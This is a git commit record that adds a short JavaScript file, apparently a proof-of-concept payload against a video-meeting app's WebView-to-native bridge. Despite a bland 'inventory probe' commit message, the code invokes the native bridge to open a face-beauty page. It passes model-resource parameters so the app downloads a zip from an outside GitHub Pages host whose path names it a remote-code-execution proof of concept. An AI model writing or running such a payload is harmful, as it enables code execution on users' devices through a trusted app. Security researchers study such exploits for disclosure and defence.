ba678db6d55e5b80e3ef6dd0b11b7aafeab49c7b
whs <401056294@qq.com>
2026-09-06 00:45:03 -0400

    add p118 media VM inventory probe

---
+++ p118pay.js
@@ -0,0 +1,7 @@
+(function(){
+  document.title='P118PAY';
+  window.__p118=function(r){document.title='P118CB:'+r};
+  var u='https://gitwhs.github.io/wm-poc-rce/p50.zip',m='9a199f9828d475cc50b62862b43284a5';
+  var p={model_resource_url_:u,model_resource_md5_:m,model_resource_url:u,model_resource_md5:m,resource_url_:u,resource_md5_:m,resource_url:u,resource_md5:m,url:u,md5:m,from_webView:true};
+  setTimeout(function(){JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p118',module:'CommonPlugin',method:'OpenNewPage',callId:'P118-FB',param:{scheme:'wemeet://page/facebeauty',router_params:p}}))},700);
+})();
